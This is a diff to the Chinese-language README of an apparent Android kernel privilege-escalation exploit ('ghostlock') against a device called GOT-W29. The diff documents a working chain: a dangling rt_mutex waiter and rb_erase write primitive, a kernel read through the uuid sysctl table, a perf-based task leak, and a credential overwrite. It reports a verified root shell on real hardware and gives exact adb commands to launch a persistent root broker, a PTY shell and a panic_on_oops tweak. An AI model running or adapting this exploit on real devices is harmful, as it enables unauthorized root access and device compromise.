@@ -13,19 +13,20 @@
    EDEADLK 悬空 → `setsockopt(SOL_IP, MCAST_BLOCK_SOURCE, group_source_req 0x108)`
    投递 fake waiter（copy 落点 `E-0x210`，waiter 置于 buf+0x60 恰好覆盖 `E-0x1b0`）
    → `sched_setattr` 触发 walk → `rb_erase` 写 `sysctl_bootid`，工具自验证
-   `write_ok=1`（boot_id 高 8 字节 = `0xffffff800b412320`）。
+   `write_ok=1`（boot_id 高 8 字节 = `0xffffff800b412320`）。这个 boot_id
+   目标仅用于 `--verify-write` 自检；正式 A 路线改用独立 uuid ctl_table。
 3. **早期“投递死结”结论已撤销**：旧扫描把 `sock_setsockopt` 的 0x80 帧算进了
    setsockopt 链。反汇编 + QEMU 实测确认 `__arm64_sys_setsockopt` 对
    `level != SOL_SOCKET` **直接 `blr ops->setsockopt`**，不经过 `sock_setsockopt`；
    修正后 `do_ip_setsockopt` 拷贝深度 = 0x210（旧判 0x290），几何合身。
    已排除的机制：pselect/select、ptrace、import_iovec、ppoll、SCTP（实测 0x158）。
-4. **设备端剩余工作**：MCAST setsockopt 的 SELinux 放行验证（mrx 在 EMUI 下以
-   shell 身份使用同款载体提权成功，预期可行）、真机返回路径/park 行为复核
-   （可用 KPM 直接观测 W）、以及后利用链的 SELinux 适配（机制已实现，见
-   `--root`）。**HKIP 差异**：GOT-W29 内核符号表与镜像里没有 `hkip_*`/
-   hypervisor 挂钩，全镜像 97 处 `hvc` 指令也都不在 cred/cap/SELinux 路径上
-   （只有 KVM/SMCCC/调试传输驱动），即 mrx 那套 hypervisor xid 保护在本机
-   很可能不存在——真机可直接按普通 root 流程走。
+4. **真机 A 路线已完整通过**：保留 `u:r:shell:s0`，修改 uid/gid 后通过
+   `setresuid(0,0,0)` 提交合法 private root cred；`STATUS`、通用 `id`
+   和完整 PTY root shell 均已在 GOT-W29 真机验证。A 路线经独立
+   `random/uuid` ctl_table 做 arbitrary read，不再修改 `sysctl_bootid`，
+   App 冷启动和 `/dev/ashmem<boot_id>` 正常。
+5. **B 路线仍是 TODO**：`u:r:kernel:s0` 加全 capability 需要先解决 cred
+   引用生命周期、RCU 回收以及 kernel 域的 exec/socket/mount 策略边界。
 
 ---
 
@@ -132,70 +133,98 @@ EDEADLK、walk 成功、hrtimer 超时、载体拷贝成功后才因假地址组
 | pointer（rb_erase Case 2：单左子） | `pc=value, right=0, left=target` | `*(target) = value`（64 位全量，颜色位保留）；副作用 `*(value+8) = target`，因此 `value` 必须可读且其 +8 可牺牲 |
 | leaf（Case 1：无子） | `pc=target-8, right=0, left=0` | `*(target) = 0`；只有一次干净写（无副作用），`pc` 低位=0 → RED → 不触发 rebalance，但 `__rb_change_child` 会读一次 `*(target-8)` |
 
-### 读原语（移植自 mrx-w09 的 boot_id 通道）
+### 读原语（独立 uuid ctl_table，不再污染 boot_id）
 
-`random_table[4].data`（= `&sysctl_bootid`，link `0xffffff800b4cd730`；由
-`.rela.dyn` 里唯一一条 addend=`0xffffff800b7f8b64` 的 R_AARCH64_RELATIVE 确认）
-被写原语改成目标地址 A 后，读 `/proc/sys/kernel/random/boot_id` 即返回
-`[A, A+16)`。注意：
-
-- `proc_do_uuid()` 在 `((u8 *)A)[8] == 0` 时会重新生成 16 字节 UUID（并改写 A），
-  被读窗口 byte 8 必须非零；
-- 指针写的副作用会写 `A+8` = `.data` 槽地址，所以读回高半区恒为该槽地址；
-  需要精确读 16 字节时应避开这一位置。
-
-`--verify-read` 自检：把 `.data` 指向 boot_id ctl_table 条目 +0x10（`maxlen=16,
-mode=0444` → 常量 `0x0000012400000010`）读回，再用 `restore` 步骤指回
-`sysctl_bootid`。
-
-### 端到端提权（uid 2000 → 0，QEMU 已验证）
-
-`--escalate`（设备 shell 路径同款，全程无 RT）：
-
-1. **perf 泄露 current**：`PERF_COUNT_SW_CPU_CLOCK` + `PERF_SAMPLE_REGS_INTR`
-   （arm64 33 个寄存器），触发器用 `nanosleep(1µs)`（单任务时 `sched_yield`
-   不进 `__schedule`）。取 `__schedule` 内 `x27`：`mrs x27, sp_el0` 在 +0x40，
-   但 +0x68 的 `ldr w8, [x27, 0x50]!` 会把 x27 抬 0x50，需减回；候选要求
-   64 字节对齐。
-2. **comm 校验**：用读原语读候选 `task+0x990`，等于 `"ghostloc"` 才继续
-   （读的副作用写坏 comm 高 8 字节，只影响进程名显示）。
-3. **cred 指针写**：`task+0x980`(real_cred) / `task+0x988`(cred) ← `init_cred`
-   （0xffffff800b42e9c0），随后本进程 `getuid()==0`。
-4. **修复**：指针写副作用把 `init_cred+8`(gid) 覆盖成目标地址，用 leaf 零写
-   还原；最后把 boot_id `.data` 指回 `sysctl_bootid`。
-
-QEMU 实测（`--no-rt --attempts 4`，uid 2000 起跑）：
+正式提权路径使用 `/proc/sys/kernel/random/uuid` 的独立 ctl_table：
 
 ```text
-escalate: candidate 1/1 task=ffffffc07a373240 (n=12)
-slide read8 boot_id ... lo=636f6c74736f6867 ...  ok=1        # "ghostloc" 确认
-slide escalate-cred attempt 1 ok=1 ... target=ffffffc07a373bc8
-slide child pid=246 uid=0 ...                                # 之后的子进程已是 root
-init: ghostlock_exe exited status=0x0 (SUCCESS)              # wrapper 独立退出码标记
+entry:  0xffffff800b4cd768
+.data: 0xffffff800b4cd770 (初始 NULL)
 ```
 
-失败模式（flaky）：约每几次 attempt 会有一次 walk 卡在
-`rt_mutex_adjust_prio_chain` 的 `raw_spin_trylock` 重试循环（fake waiter 被
-返回路径 clobber），表现为该 attempt 超时；靠 `--attempts N` 重试（设备端同
-mrx：重试到成功）。
+写原语把 `.data` 指向目标地址 A 后，读 `/proc/sys/kernel/random/uuid`
+返回 `[A, A+16)`；随后用 leaf-zero 把 `.data` 恢复为 NULL。boot_id
+的 ctl_table 和 `sysctl_bootid[16]` 全程不参与，因此启动时创建的
+`/dev/ashmem<boot_id>` 继续匹配。
 
-### 后利用链（`--root`，端局机制在 QEMU 可测）
+约束与副作用：
 
-`--root` = `--escalate` + 端局：挂 tmpfs 到 `/data/local/tmp/glrt`，把
-`/system/bin/sh`（无 shell 时退化为本程序自身）复制进去并
-`chown 0:0; chmod 4755`，然后 fork 一个 uid 2000 的子进程 exec 它，验证
-setuid 真的生效——shell 版本执行 `id > proof.txt` 并回读检查 `uid=0(`；
-自身版本走 `--glsh-proof`（打印 uid/euid，euid==0 才返回 0）。
+- `proc_do_uuid()` 在目标窗口 byte 8 为零时可能重新生成 UUID；正式 A
+  路线读取的 `task->comm`/`task->cred` 都满足该 byte 非零。
+- 指针写仍有固定副作用 `*(A+8) = uuid_data_slot`。A 路线只影响当前
+  task comm，代码用 `PR_GET_NAME`/`PR_SET_NAME` 恢复。
+- 旧 `--verify-read` 仍通过 boot_id 做自检，会改变 high 8 字节；仅用于
+  QEMU/写原语验证，不要在需要保持 App 正常的真机上运行。
 
-设备侧待确认：cred→init_cred 后本进程持全 caps 且 `cred->security` 来自
-`init_cred`，但 `/system/bin/sh` 的 SELinux 标签/挂载点上下文是否放行
-exec/setuid 需要真机验证（mrx 走 policydb.permissive_map + AVC 冲刷，本内核
-符号表里没有 policydb 全局符号，需要另找路线或直接依赖 init_cred 的 SID）。
+### 端到端提权（A 路线：保留 shell SID，真机已完成）
 
-验证状态：**已在 QEMU（8 核 SMP）完整通过**——`escalate-cred` PASSED →
-`escalate-repair-gid` → tmpfs 挂载 + 4755 `glsh` 安装 → uid 2000 子进程执行
-返回 `glsh-proof: uid=2000 euid=0`，wrapper 记录
-`init: ghostlock_exe[--root] exited status=0x0 (SUCCESS)`。
+`--simple-root` 不把 cred 指针直接改成 `init_cred`：
+
+1. **perf 泄露 current**：`PERF_COUNT_SW_CPU_CLOCK` +
+   `PERF_SAMPLE_REGS_INTR`，取 `__schedule` 内 `x27 = sp_el0`。QEMU
+   采样期间加入同 CPU 竞争线程和 `sched_yield + nanosleep` 触发，真机
+   同样已通过。
+2. **读取 task/cred**：通过独立 uuid ctl_table 读 `task+0x990` 和
+   `task+0x988`，comm 校验为 `"ghostloc"`。
+3. **合法 root cred**：leaf-zero 清零 live cred 的 uid/gid，再调用
+   `setresuid(0,0,0)`，走 `prepare_creds() -> commit_creds()` 生成
+   private root cred，保留 `u:r:shell:s0`。
+4. **broker**：进程进入常驻 `@gl_su` server；每个写操作消费的 waiter
+   仍由 detach child 永久 park，避免 exit-time walk。
+
+QEMU（无 KPM）与真机验证均为 `uid=0 euid=0`。真机结果：
+
+```text
+simple-root: LEGAL ROOT uid=0 euid=0 ctx=u:r:shell:s0
+STATUS: uid=0 euid=0 gid=0 egid=2000 ... ctx=u:r:shell:s0
+id:     uid=0(root) gid=0(root) ... context=u:r:shell:s0
+```
+
+单次失败仍可能把 fake waiter clobber 并造成 oops；设备侧继续使用
+`--attempts 1`，失败就重启，不要在同一 boot 内重试。
+
+### 后利用：root broker 与完整 PTY shell（真机已完成）
+
+broker 启动命令：
+
+```sh
+adb shell /data/local/tmp/ghostlock_exe \
+  --su-server --simple-root --fake-lock-window \
+  --detach --probe-cycle --no-rt --attempts 1 \
+  --leak-timeout 60 --fsync \
+  --log-file /sdcard/ghostlock-su.log
+```
+
+控制命令和交互 shell：
+
+```sh
+adb shell /data/local/tmp/ghostlock_exe --rsh STATUS
+adb shell /data/local/tmp/ghostlock_exe --rsh id
+adb shell -t /data/local/tmp/ghostlock_exe --rsh-shell
+```
+
+`--rsh-shell` 必须使用 `adb shell -t`。broker 通过 `/dev/ptmx` 分配 PTY，
+shell 子进程执行 `setsid()`/`TIOCSCTTY`；客户端将本地终端切到 raw 并传入
+行列数。已验证 `tty` 返回 `/dev/pts/N`，Ctrl-C、方向键编辑和后台
+`jobs` 均正常，不再出现 `won't have full job control`。
+
+同一 boot 下冷启动 `tv.danmaku.bilibilihd` 成功（COLD，约 0.9s），无
+ashmem 路径错误或 App FATAL EXCEPTION；执行前后 boot_id 和 ashmem 节点
+始终匹配。
+
+#### B 路线：kernel SID 与全 caps（TODO）
+
+尚未完成。目标是把进程提升为 `u:r:kernel:s0` 并持有完整 capability，
+同时保证 cred 生命周期和 exec 边界正确。旧研究路径直接令
+`cred = &init_cred`，会出现：
+
+- 退出时 `put_cred_rcu -> kmem_cache_free` panic；
+- kernel 域不能正常 exec 用户态 shell；
+- broker socket bind/mount/文件访问受 kernel 域策略限制。
+
+待处理：合法 cred/refcount 生命周期、fork/exec root child、cred security
+SID 继承、kernel 域 socket/mount 策略，以及是否需要 permissive/SID 修复。
+必须在独立 QEMU 和干净真机 boot 上验证后再合入。
 
 注意：多 vCPU 下内核会把 `__log_buf` 换成动态分配的大缓冲（8 核时 1MB），
 `tools/qemu-test/read_log.py` 已改为从 `log_buf` 指针追实际缓冲区（QMP 物理读，
@@ -319,15 +348,18 @@ make                      # NDK r29 / host clang；LOGCAT=1（logcat）默认
 ./ghostlock_exe --verify-leaf          # *(bootid+0) := 0
 ./ghostlock_exe --verify-read          # boot_id .data 指针重定向 -> 读回
 
-# 端到端提权（QEMU 已验证）：perf 泄露自己 task -> comm 校验 -> cred 写
-./ghostlock_exe --escalate --no-rt --attempts 4
+# A 路线提权（真机/QEMU 已验证）：保留 shell SID，生成 private root cred
+./ghostlock_exe --simple-root --fake-lock-window \
+                --detach --probe-cycle --no-rt --attempts 1
 
 # 示例组合
 ./ghostlock_exe --verify-write --attempts 5 --no-rt --hold
-./ghostlock_exe --root --no-rt --attempts 4              # 提权 + 4755 端局自检
 ./ghostlock_exe --selinux-relax --no-rt --attempts 4     # SELinux 放行（真机路线）
 ./ghostlock_exe --su-selftest --no-rt --attempts 4       # su 通道自检（QEMU 可跑）
-./ghostlock_exe --su-server --no-rt --attempts 4         # 常驻 root 服务（真机）
+./ghostlock_exe --su-server --simple-root \
+                --fake-lock-window --detach --no-rt --attempts 1
+./ghostlock_exe --rsh STATUS                             # 查询 broker
+adb shell -t /data/local/tmp/ghostlock_exe --rsh-shell    # 完整 PTY shell
 ./ghostlock_exe --verify-all --probe-cycle \
                 --kaslr-base 0xffffff8008080800 \
                 --log-file /data/local/tmp/gl.log      # QEMU/nokaslr
@@ -337,8 +369,10 @@ make                      # NDK r29 / host clang；LOGCAT=1（logcat）默认
 `--wait-seconds N`、`--requeue-ms N`、`--no-rt`、`--rt-prio N`、
 `--probe-cycle`（kernel.patched/QEMU 必需）、`--noconsume`、`--hold`、
 `--detach`、`--fsync`、`--verify-write`、`--verify-leaf`、`--verify-read`、
-`--verify-all`、`--escalate`、`--bench N`、`--root`、`--harden`、
-`--selinux-relax`、`--su-server`、`--su-selftest`、`--rsh CMD`、
+`--verify-all`、`--simple-root`、`--escalate`（B 研究，legacy）、
+`--bench N`、`--harden`、`--selinux-relax`、`--su-server`、`--su-selftest`、
+`--rsh CMD`、`--rsh-shell`、`--fake-lock-window`、`--waiter-task-own`、
+`--leak-timeout N`、`--fake-lock-addr ADDR`、`--do-futex-waiter-off N`、
 `--shell PATH`、`--serve-count N`、`--slot-file PATH`。**环境变量已
 全部移除**（含旧 `GOT_*` 实验开关）。
 
@@ -378,19 +412,28 @@ highbit=`0xffffff800b7a1228`（注意它按 **type** 而非 SID 置位，且写�
 限制请求数，0 = 无限）。请求行协议：
 
 - `STATUS` / `GLCAP` → uid/euid/gid/egid、CapEff/CapPrm、SELinux context
+- `GLSHELL|rows|cols` → 在独立 PTY 中启动 `/system/bin/sh -i`
 - `GLMOUNT|src|tgt|fstype|flags_hex|data`（`-` = NULL）→ 在 root 进程里 mount
 - `GLUMOUNT|tgt|flags` → umount2
 - 其它任何一行 → `/system/bin/sh -c <行>`（`--shell PATH` 可换）
 
-客户端：`--rsh 'CMD'`（未提权进程即可用）。服务进程**永不退出**（退出会走
-悬空 `pi_blocked_on` 的 exit walk）。QEMU 无 shell，`--su-selftest` 自测
-覆盖 STATUS/GLCAP/GLMOUNT/GLUMOUNT 以及通用命令行路径（`id` 交给服务端的
-shell 跑，验证 exec 出去的子进程同样持 root cred；QEMU 里用
-`tools/qemu-test/glsh.c` 顶替 `/system/bin/sh`，真机走真 shell）。
-2026-10-01 复跑：干净 boot 上 `--su-selftest` 通过，退出码 0，
-`STATUS -> ok [uid=0 euid=0 gid=0 egid=0 cap_eff=cap_prm=0000007fffffffff
-ctx=kernel]`、`GLMOUNT … tmpfs -> rc=0`、`GLUMOUNT -> rc=0`、
-`id -> ok [uid=0 euid=0 gid=0 egid=0]`。
+客户端：`--rsh 'CMD'` 用于单命令；`--rsh-shell` 通过
+`adb shell -t` 接入完整 PTY。客户端在 KASLR 之前分派，不需要等待 perf。
+服务进程**永不退出**（退出会走悬空 `pi_blocked_on` 的 exit walk）。
+
+A 路线在 GOT-W29 真机的实测：
+
+```text
+STATUS: uid=0 euid=0 gid=0 egid=2000 cap_eff=0 cap_prm=0 ctx=u:r:shell:s0
+id:     uid=0(root) gid=0(root) ... context=u:r:shell:s0
+tty:    /dev/pts/5
+jobs:   [1] + Running  sleep 30
+```
+
+`GLSHELL` 使用 `/dev/ptmx`，子 shell 通过 `setsid()`/`TIOCSCTTY` 获得
+控制终端；客户端本地 terminal 切 raw 并发送窗口尺寸，因此 Ctrl-C、
+方向键和作业控制正常。QEMU 无 PTY shell 时，`--su-selftest` 仍覆盖
+STATUS/GLCAP/GLMOUNT/GLUMOUNT 和通用命令行路径。
 
 QEMU 以本程序做 /init 时注意：内核没有控制台，fd 0/1/2 可能未打开，
 需在 wrapper 里先补上可用 fd（否则 `pipe()` 会占用 fd 0/1，子进程的
@@ -398,16 +441,17 @@ printf 会写进结果管道）。
 
 ### 设备端试跑（真机恢复后）
 
-`tools/device-run.sh`（`/system/bin/sh`，推送到 `/data/local/tmp` 执行）：
-关闭 powergenie/iaware、sync、运行、回读日志。默认
-`--escalate --no-rt --attempts 4 --hold`。
-
 ```sh
 adb push exploit/ghostlock-source/build/bin/ghostlock_exe /data/local/tmp/
-adb push tools/device-run.sh /data/local/tmp/
-adb shell sh /data/local/tmp/device-run.sh                 # 端到端提权
-adb shell sh /data/local/tmp/device-run.sh --verify-write  # 只验证载体写
-adb shell sh /data/local/tmp/device-run.sh --bench 10      # 成功率
+adb shell /data/local/tmp/ghostlock_exe \
+  --su-server --simple-root --fake-lock-window \
+  --detach --probe-cycle --no-rt --attempts 1 \
+  --leak-timeout 60 --fsync \
+  --log-file /sdcard/ghostlock-su.log
+
+adb shell /data/local/tmp/ghostlock_exe --rsh STATUS
+adb shell /data/local/tmp/ghostlock_exe --rsh id
+adb shell -t /data/local/tmp/ghostlock_exe --rsh-shell
 ```
 
 安全边界：消费过悬空指针的进程必须 park/停住，**不要 `kill -9`**
@@ -416,9 +460,9 @@ adb shell sh /data/local/tmp/device-run.sh --bench 10      # 成功率
 `--probe-cycle` 重试（值持有环在部分固件上更稳）。
 
 失败 attempt 可能触发 oops。**GOT-W29 真机的 `panic_on_oops=1`（实测）**，所以
-失败的 attempt 不是"卡一下"而是直接 panic；每次 attempt 的失败率约 1%，而一次
-`--escalate` 要跑 4–5 次写（comm 读、cred 写、修 gid、恢复 boot_id……），也就是
-**每次提权尝试大约几个百分点的概率会 panic**。
+失败不是"卡一下"而是直接 panic。A 路线一次成功也要跑多次 walk（comm 读、
+uuid restore、cred 读、uuid restore、uid/gid leaf 写），因此设备侧必须使用
+`--attempts 1`，失败就重启，不要在同一 boot 内重试。
 
 接下来要问的是"panic 之后设备会不会自己重启"，这决定了要不要用 `--harden`：
 
@@ -426,12 +470,12 @@ adb shell sh /data/local/tmp/device-run.sh --bench 10      # 成功率
   AP 看门狗也可能兜底）：panic 反而是**干净的恢复路径**——重启后悬空指针随进程
   消失，重新来过即可。这种情况下**不要**清 `panic_on_oops`：清掉之后失败会变成
   "8 核全卡死、要手动长按电源"的形态，比自动重启难受得多。
-- 若不会自动重启（panic 停在屏幕上）：两种形态都要人工断电，此时再考虑
-  `--harden`（或 `--root`，它会自动先做）leaf 零写清 `panic_on_oops`——注意
-  `--harden` 自己就是一次写原语尝试，同样吃那 ~1%。
+- 若不会自动重启（panic 停在屏幕上）：两种形态都要人工断电；此时再考虑
+  `--harden` leaf 零写清 `panic_on_oops`。`--harden` 自己就是一次写原语
+  尝试，同样吃失败风险。
 
-无论哪种情况，真机上都要用 `--attempts 1`：一次失败已经结束这个 boot，重试没有
-意义（`device-run.sh` 的默认值已按此改）。
+无论哪种情况，真机上都要用 `--attempts 1`：一次失败已经结束这个 boot，
+重试没有意义。消费过悬空 waiter 的 detach child 不能直接 kill，清理靠重启。
 
 ## 调试工具链
 
